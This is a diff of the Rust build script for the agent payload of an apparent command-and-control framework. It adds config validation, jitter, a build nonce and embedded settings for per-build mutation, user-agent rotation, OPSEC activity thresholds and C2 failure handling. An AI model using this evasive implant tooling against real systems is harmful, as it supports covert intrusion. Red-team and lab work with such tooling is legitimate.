@@ -63,17 +63,13 @@ const USER_AGENT_POOL: &[&str] = &[
 fn resolve_mutation_seed() -> (u64, bool) {
     match env::var("MUTATION_SEED") {
         Ok(raw) => {
-            let trimmed = raw.trim().trim_start_matches("0x");
-            match u64::from_str_radix(trimmed, 16) {
-                Ok(seed) => (seed, true),
-                Err(_) => {
-                    println!(
-                        "cargo:warning=Invalid MUTATION_SEED '{}', falling back to fixed dev seed",
-                        raw
-                    );
-                    (DEV_MUTATION_SEED, false)
-                }
+            if raw.trim().is_empty() {
+                return (DEV_MUTATION_SEED, false);
             }
+            let trimmed = raw.trim().trim_start_matches("0x");
+            let seed = u64::from_str_radix(trimmed, 16)
+                .unwrap_or_else(|_| panic!("MUTATION_SEED must be a hexadecimal u64"));
+            (seed, true)
         }
         Err(_) => (DEV_MUTATION_SEED, false),
     }
@@ -106,6 +102,54 @@ fn parse_boolean_environment(name: &str, default: bool) -> bool {
         Ok(raw) if raw == "false" => false,
         Ok(raw) => panic!("{name} must be true or false, got {raw:?}"),
         Err(_) => default,
+    }
+}
+
+#[allow(clippy::too_many_arguments)]
+fn validate_runtime_config_values(
+    sleep_interval: u64,
+    jitter: u64,
+    base_score_threshold_bg_to_reduced: f32,
+    base_score_threshold_reduced_to_full: f32,
+    c2_failure_threshold_increase_factor: f32,
+    c2_failure_threshold_decrease_factor: f32,
+    c2_dynamic_threshold_max_multiplier: f32,
+) {
+    if sleep_interval == 0 {
+        panic!("SLEEP_INTERVAL must be at least one second");
+    }
+    sleep_interval
+        .checked_add(jitter)
+        .unwrap_or_else(|| panic!("SLEEP_INTERVAL plus JITTER exceeds the supported u64 range"));
+    if !base_score_threshold_bg_to_reduced.is_finite()
+        || !base_score_threshold_reduced_to_full.is_finite()
+        || !(0.0..=100.0).contains(&base_score_threshold_bg_to_reduced)
+        || !(0.0..=100.0).contains(&base_score_threshold_reduced_to_full)
+    {
+        panic!("OPSEC score thresholds must each be finite and within 0..=100");
+    }
+    if base_score_threshold_bg_to_reduced >= base_score_threshold_reduced_to_full {
+        panic!(
+            "BASE_SCORE_THRESHOLD_BG_TO_REDUCED must be lower than BASE_SCORE_THRESHOLD_REDUCED_TO_FULL"
+        );
+    }
+    if !c2_failure_threshold_increase_factor.is_finite()
+        || c2_failure_threshold_increase_factor < 0.0
+        || (c2_failure_threshold_increase_factor != 0.0
+            && c2_failure_threshold_increase_factor < 1.0)
+    {
+        panic!("C2_THRESH_INC_FACTOR must be zero or a finite value of at least one");
+    }
+    if !c2_failure_threshold_decrease_factor.is_finite()
+        || !(0.0..=1.0).contains(&c2_failure_threshold_decrease_factor)
+    {
+        panic!("C2_THRESH_DEC_FACTOR must be finite and within 0..=1");
+    }
+    if !c2_dynamic_threshold_max_multiplier.is_finite()
+        || c2_dynamic_threshold_max_multiplier < 0.0
+        || (c2_dynamic_threshold_max_multiplier != 0.0 && c2_dynamic_threshold_max_multiplier < 1.0)
+    {
+        panic!("C2_THRESH_MAX_MULT must be zero or a finite value of at least one");
     }
 }
 
@@ -277,19 +321,22 @@ fn generate_mutation_module(rng: &mut SplitMix64, out_dir: &Path) {
 fn main() {
     log_build("Build script started");
     println!("cargo:rerun-if-changed=build.rs");
-    println!("cargo:rerun-if-changed=config.json");
     println!("cargo:rerun-if-env-changed=LISTENER_HOST");
     println!("cargo:rerun-if-env-changed=LISTENER_PORT");
     println!("cargo:rerun-if-env-changed=SERVER_URL");
     println!("cargo:rerun-if-env-changed=LISTENER_ID");
     println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
+    println!("cargo:rerun-if-env-changed=JITTER");
     println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
     println!("cargo:rerun-if-env-changed=PROTOCOL");
     println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
     println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
     println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
     println!("cargo:rerun-if-env-changed=ALLOW_INVALID_CERTS");
-    println!("cargo:rerun-if-env-changed=ENROLLMENT_CREDENTIAL");
+    // Cargo persists every rerun-if-env-changed value in plaintext fingerprint
+    // metadata. A fresh non-secret wrapper nonce invalidates the build without
+    // recording the embedded bootstrap credential.
+    println!("cargo:rerun-if-env-changed=MICROC2_BUILD_NONCE");
     println!("cargo:rerun-if-env-changed=ALLOW_INSECURE_ISOLATED_LAB");
     println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
     println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
@@ -330,11 +377,8 @@ fn main() {
         .iter()
         .map(|b| format!("{:02x}", b))
         .collect::<String>();
-    // Seed-selected user-agent and randomized endpoint path segments. The path
-    // segments are recorded in the config for the Phase 2 transport profiles;
-    // the v0 agent keeps using the fixed routes.
+    // Select the effective HTTP user-agent from the same per-build seed.
     let user_agent = USER_AGENT_POOL[rng.below(USER_AGENT_POOL.len() as u64) as usize];
-    let endpoint_segments: Vec<String> = (0..2).map(|_| rng.alnum(8)).collect();
 
     // Get configuration from environment variables
     let server_host = env::var("LISTENER_HOST").unwrap_or_default();
@@ -342,6 +386,7 @@ fn main() {
     let server_url = env::var("SERVER_URL").unwrap_or_default();
     let listener_id = env::var("LISTENER_ID").unwrap_or_default();
     let sleep_interval = parse_environment::<u64>("SLEEP_INTERVAL", "60");
+    let jitter = parse_environment::<u64>("JITTER", "2");
     let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
     let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
         if server_port == "443" {
@@ -355,8 +400,28 @@ fn main() {
     let socks5_port = parse_environment::<u16>("SOCKS5_PORT", "9050");
     let allow_invalid_certs = parse_boolean_environment("ALLOW_INVALID_CERTS", false);
     let enrollment_credential = env::var("ENROLLMENT_CREDENTIAL").unwrap_or_default();
+    let build_nonce = env::var("MICROC2_BUILD_NONCE").unwrap_or_default();
     let allow_insecure_isolated_lab =
         parse_boolean_environment("ALLOW_INSECURE_ISOLATED_LAB", false);
+    let base_score_threshold_bg_to_reduced =
+        parse_environment::<f32>("BASE_SCORE_THRESHOLD_BG_TO_REDUCED", "20.0");
+    let base_score_threshold_reduced_to_full =
+        parse_environment::<f32>("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL", "60.0");
+    let min_duration_full_opsec_secs = parse_environment::<u64>("MIN_FULL_OPSEC_SECS", "300");
+    let min_duration_background_opsec_secs = parse_environment::<u64>("MIN_BG_OPSEC_SECS", "60");
+    let base_max_consecutive_c2_failures = parse_environment::<u32>("BASE_MAX_C2_FAILS", "5");
+    let min_duration_reduced_activity_secs =
+        parse_environment::<u64>("MIN_REDUCED_OPSEC_SECS", "120");
+    let reduced_activity_sleep_secs =
+        parse_environment::<u64>("REDUCED_ACTIVITY_SLEEP_SECS", "120");
+    let c2_failure_threshold_increase_factor =
+        parse_environment::<f32>("C2_THRESH_INC_FACTOR", "1.1");
+    let c2_failure_threshold_decrease_factor =
+        parse_environment::<f32>("C2_THRESH_DEC_FACTOR", "0.9");
+    let c2_threshold_adjust_interval_secs =
+        parse_environment::<u64>("C2_THRESH_ADJ_INTERVAL", "3600");
+    let c2_dynamic_threshold_max_multiplier = parse_environment::<f32>("C2_THRESH_MAX_MULT", "2.0");
+    let proc_scan_interval_secs = parse_environment::<u64>("PROC_SCAN_INTERVAL_SECS", "300");
 
     if allow_invalid_certs && !allow_insecure_isolated_lab {
         panic!(
@@ -371,6 +436,7 @@ fn main() {
     log_build(&format!("SERVER_URL: {:?}", server_url));
     log_build(&format!("LISTENER_ID: {:?}", listener_id));
     log_build(&format!("SLEEP_INTERVAL: {}", sleep_interval));
+    log_build(&format!("JITTER: {}", jitter));
     log_build(&format!("PAYLOAD_ID: {:?}", payload_id));
     log_build(&format!("PROTOCOL: {:?}", protocol));
     log_build(&format!("SOCKS5_ENABLED: {}", socks5_enabled));
@@ -417,6 +483,11 @@ fn main() {
         if enrollment_credential.is_empty() {
             panic!("ENROLLMENT_CREDENTIAL is required for an agent payload build");
         }
+        if build_nonce.is_empty() {
+            panic!(
+                "MICROC2_BUILD_NONCE is required for an agent payload build; invoke agent/build.sh"
+            );
+        }
         if !is_canonical_bootstrap_credential(&enrollment_credential) {
             panic!(
                 "ENROLLMENT_CREDENTIAL must be a canonical 32-byte unpadded base64url credential"
@@ -425,12 +496,21 @@ fn main() {
         if protocol != "https" && !allow_insecure_isolated_lab {
             panic!("non-HTTPS agent payload builds require ALLOW_INSECURE_ISOLATED_LAB=true");
         }
+        validate_runtime_config_values(
+            sleep_interval,
+            jitter,
+            base_score_threshold_bg_to_reduced,
+            base_score_threshold_reduced_to_full,
+            c2_failure_threshold_increase_factor,
+            c2_failure_threshold_decrease_factor,
+            c2_dynamic_threshold_max_multiplier,
+        );
         let server_url = canonical_server_url(&server_url, &protocol, &server_host, &server_port);
         log_build("Using environment variables for config");
         let config = json!({
             "server_url": server_url,
             "sleep_interval": sleep_interval,
-            "jitter": 2,
+            "jitter": jitter,
             "payload_id": payload_id,
             "agent_id": "",
             "listener_id": listener_id,
@@ -438,56 +518,39 @@ fn main() {
             "protocol": protocol,
             "user_agent": user_agent,
             "mutation_seed": format!("{mutation_seed:016x}"),
-            "mutation_endpoint_segments": endpoint_segments,
             "socks5_enabled": socks5_enabled,
             "socks5_host": socks5_host,
             "socks5_port": socks5_port,
             "allow_invalid_certs": allow_invalid_certs,
             "allow_insecure_isolated_lab": allow_insecure_isolated_lab,
-            "base_score_threshold_bg_to_reduced":
-                parse_environment::<f32>("BASE_SCORE_THRESHOLD_BG_TO_REDUCED", "20.0"),
-            "base_score_threshold_reduced_to_full":
-                parse_environment::<f32>("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL", "60.0"),
-            "min_duration_full_opsec_secs":
-                parse_environment::<u64>("MIN_FULL_OPSEC_SECS", "300"),
-            "min_duration_background_opsec_secs":
-                parse_environment::<u64>("MIN_BG_OPSEC_SECS", "60"),
-            "base_max_consecutive_c2_failures":
-                parse_environment::<u32>("BASE_MAX_C2_FAILS", "5"),
-            "min_duration_reduced_activity_secs":
-                parse_environment::<u64>("MIN_REDUCED_OPSEC_SECS", "120"),
-            "reduced_activity_sleep_secs":
-                parse_environment::<u64>("REDUCED_ACTIVITY_SLEEP_SECS", "120"),
-            "c2_failure_threshold_increase_factor":
-                parse_environment::<f32>("C2_THRESH_INC_FACTOR", "1.1"),
-            "c2_failure_threshold_decrease_factor":
-                parse_environment::<f32>("C2_THRESH_DEC_FACTOR", "0.9"),
-            "c2_threshold_adjust_interval_secs":
-                parse_environment::<u64>("C2_THRESH_ADJ_INTERVAL", "3600"),
-            "c2_dynamic_threshold_max_multiplier":
-                parse_environment::<f32>("C2_THRESH_MAX_MULT", "2.0"),
-            "proc_scan_interval_secs":
-                parse_environment::<u64>("PROC_SCAN_INTERVAL_SECS", "300"),
+            "base_score_threshold_bg_to_reduced": base_score_threshold_bg_to_reduced,
+            "base_score_threshold_reduced_to_full": base_score_threshold_reduced_to_full,
+            "min_duration_full_opsec_secs": min_duration_full_opsec_secs,
+            "min_duration_background_opsec_secs": min_duration_background_opsec_secs,
+            "base_max_consecutive_c2_failures": base_max_consecutive_c2_failures,
+            "min_duration_reduced_activity_secs": min_duration_reduced_activity_secs,
+            "reduced_activity_sleep_secs": reduced_activity_sleep_secs,
+            "c2_failure_threshold_increase_factor": c2_failure_threshold_increase_factor,
+            "c2_failure_threshold_decrease_factor": c2_failure_threshold_decrease_factor,
+            "c2_threshold_adjust_interval_secs": c2_threshold_adjust_interval_secs,
+            "c2_dynamic_threshold_max_multiplier": c2_dynamic_threshold_max_multiplier,
+            "proc_scan_interval_secs": proc_scan_interval_secs,
         });
         serde_json::to_string_pretty(&config)
             .unwrap_or_else(|err| panic!("failed to serialize embedded config: {err}"))
-    } else if let Ok(content) = fs::read_to_string("config.json") {
-        log_build("Using config.json file for config");
-        // We assume config.json contains the new fields if needed,
-        // otherwise serde(default) in AgentConfig will handle it.
-        content
     } else {
         log_build("No valid config found, using default embedded config");
         // Update the hardcoded fallback JSON
         r#"{
             "server_url": "",
-            "sleep_interval": 5,
+            "sleep_interval": 60,
             "jitter": 2,
             "payload_id": "",
             "agent_id": "",
             "listener_id": "",
             "enrollment_credential": "",
             "protocol": "http",
+            "mutation_seed": "4d6963726f433200",
             "socks5_enabled": false,
             "socks5_host": "127.0.0.1",
             "socks5_port": 9050,
@@ -500,12 +563,11 @@ fn main() {
             "base_max_consecutive_c2_failures": 5,
             "min_duration_reduced_activity_secs": 120,
             "reduced_activity_sleep_secs": 120,
-            "c2_failure_threshold_increase_factor": 1.0,
-            "c2_failure_threshold_decrease_factor": 1.0,
-            "c2_threshold_adjust_interval_secs": {},
-            "c2_dynamic_threshold_max_multiplier": 1.0
+            "c2_failure_threshold_increase_factor": 1.1,
+            "c2_failure_threshold_decrease_factor": 0.9,
+            "c2_threshold_adjust_interval_secs": 3600,
+            "c2_dynamic_threshold_max_multiplier": 2.0
         }"#
-        .replace("{}", &u64::MAX.to_string())
         .to_string()
     };
 
